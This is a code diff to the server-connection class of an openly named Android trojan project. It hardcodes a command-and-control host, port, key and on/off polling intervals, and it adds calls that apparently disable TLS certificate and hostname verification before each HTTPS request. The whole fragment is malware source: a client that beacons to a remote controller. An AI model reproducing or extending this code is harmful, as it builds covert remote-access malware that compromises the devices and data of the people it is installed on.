@@ -1,10 +1,8 @@
-package trojan.android.android_trojan.Action.AsyncTask;
+package trojan.android.android_trojan.Action;
 
 import android.content.Context;
 import android.os.AsyncTask;
-import android.os.PowerManager;
 import android.util.Log;
-import android.util.Xml;
 
 import java.io.BufferedReader;
 import java.io.DataOutputStream;
@@ -15,12 +13,10 @@ import java.io.UnsupportedEncodingException;
 import java.net.MalformedURLException;
 import java.net.ProtocolException;
 import java.net.URL;
-import java.net.URLEncoder;
 import java.security.KeyManagementException;
 import java.security.MessageDigest;
 import java.security.NoSuchAlgorithmException;
 import java.security.cert.X509Certificate;
-import java.util.ArrayList;
 
 import javax.net.ssl.HostnameVerifier;
 import javax.net.ssl.HttpsURLConnection;
@@ -29,9 +25,6 @@ import javax.net.ssl.SSLSession;
 import javax.net.ssl.TrustManager;
 import javax.net.ssl.X509TrustManager;
 
-import trojan.android.android_trojan.Action.ActionService;
-import trojan.android.android_trojan.Action.Tools;
-import trojan.android.android_trojan.R;
 
 
 public class ConnectionServerTask extends AsyncTask<Integer, Integer, Integer> {
@@ -52,11 +45,16 @@ public class ConnectionServerTask extends AsyncTask<Integer, Integer, Integer> {
 
     public ConnectionServerTask(Context context) {
         this.context = context;
-        this.KEY = SALT + context.getResources().getString(R.string.KEY);
+        /*this.KEY = SALT + context.getResources().getString(R.string.KEY);
         this.host = context.getResources().getString(R.string.HOST);
         this.port = context.getResources().getString(R.string.PORT);
         this.timeon = Integer.valueOf(context.getResources().getString(R.string.TIMEON));
-        this.timeoff = Integer.valueOf(context.getResources().getString(R.string.TIMEOFF));
+        this.timeoff = Integer.valueOf(context.getResources().getString(R.string.TIMEOFF));*/
+        this.KEY = SALT + "8df639b301a1e10c36cc2f03bbdf8863";
+        this.host = "pi.remijouannet.com";
+        this.port = "8080";
+        this.timeon = 4000;
+        this.timeoff = 54000;
         this.time = timeon;
     }
 
@@ -120,6 +118,7 @@ public class ConnectionServerTask extends AsyncTask<Integer, Integer, Integer> {
     private String getHttp(URL url) {
         Log.d(TAG, "getHttp");
         String result = null;
+        acceptAll();
         try {
             HttpsURLConnection conn = (HttpsURLConnection) url.openConnection();
             conn.setReadTimeout(5000);
@@ -145,7 +144,7 @@ public class ConnectionServerTask extends AsyncTask<Integer, Integer, Integer> {
         Log.d(TAG, "postHttp");
         String result = null;
         String urlParameters = json;
-
+        acceptAll();
         try {
             HttpsURLConnection conn =
                     (HttpsURLConnection) url.openConnection();
